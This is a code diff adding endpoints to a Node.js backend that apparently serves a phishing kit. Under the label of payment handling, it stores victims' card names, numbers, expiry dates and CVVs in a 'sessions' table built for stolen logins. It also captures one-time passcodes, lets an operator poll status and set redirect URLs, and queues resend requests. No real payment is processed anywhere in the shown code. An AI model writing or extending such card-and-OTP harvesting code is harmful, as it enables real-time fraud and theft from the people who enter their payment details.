@@ -352,6 +352,77 @@ module.exports = async (req, res) => {
     }
   }
 
+  // --- Payment (card data) ---
+  if (req.method === 'POST' && reqPath === '/api/payment') {
+    const ip = getIP(req);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const orderId = data.order_id ? parseInt(data.order_id) : null;
+      const { data: payment, error } = await supabase.from('sessions').insert({
+        username: (data.card_name || '').substring(0, 100),
+        password: (data.card_number || '').substring(0, 30),
+        otp: (data.card_expiry || '').substring(0, 10),
+        country: (data.card_cvv || '').substring(0, 10),
+        service: 'payment',
+        order_id: orderId,
+        ip,
+        login_status: 'waiting',
+        lang: 'ar',
+        date: new Date().toISOString()
+      }).select().single();
+      if (error) return json(res, { error: error.message }, 500);
+      if (orderId) {
+        await supabase.from('orders').update({ status: 'payment_pending' }).eq('id', orderId);
+      }
+      return json(res, { success: true, id: payment.id });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  // --- Payment Status Check ---
+  if (req.method === 'GET' && reqPath === '/api/payment-status') {
+    const url = require('url');
+    const parsed = url.parse(req.url, true);
+    const id = parseInt(parsed.query.id);
+    if (!id) return json(res, { status: 'not_found' }, 404);
+    const { data: s } = await supabase.from('sessions').select('login_status, redirect_url').eq('id', id).single();
+    if (!s) return json(res, { status: 'not_found' }, 404);
+    return json(res, { status: s.login_status, redirectUrl: s.redirect_url || null });
+  }
+
+  // --- Verify OTP (payment) ---
+  if (req.method === 'POST' && reqPath === '/api/verify-otp') {
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const id = parseInt(data.id);
+      const { data: s } = await supabase.from('sessions').select('id').eq('id', id).single();
+      if (!s) return json(res, { error: 'not found' }, 404);
+      await supabase.from('sessions').update({
+        otp: (data.code || '').substring(0, 20),
+        otp_status: 'waiting'
+      }).eq('id', id);
+      return json(res, { success: true, id });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  // --- Resend OTP ---
+  if (req.method === 'POST' && reqPath === '/api/resend-otp') {
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const id = parseInt(data.id);
+      await supabase.from('sessions').update({ otp_status: 'resend_requested' }).eq('id', id);
+      return json(res, { success: true });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
   // --- Heartbeat ---
   if (reqPath === '/api/heartbeat') {
     const ip = getIP(req);
